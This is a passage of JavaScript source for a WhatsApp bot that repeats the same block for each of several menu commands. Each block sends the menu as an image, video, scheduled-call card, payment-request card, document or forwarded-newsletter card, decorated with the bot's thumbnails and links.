                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'nsfwmenu': {
let xmenu_oh = `Hi user ${pushname}\n${nsfwmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'animemenu': {
let xmenu_oh = `Hi user ${pushname}\n${animemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'stickermenu': {
let xmenu_oh = `Hi user ${pushname}\n${stickermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'databasemenu': {
let xmenu_oh = `Hi user ${pushname}\n${databasemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'searchmenu': {
let xmenu_oh = `Hi user ${pushname}\n${searchmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'storemenu': {
let xmenu_oh = `Hi user ${pushname}\n${storemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'aimenu': {
let xmenu_oh = `Hi user ${pushname}\n${aimenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'religionmenu': {
let xmenu_oh = `Hi user ${pushname}\n${religionmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
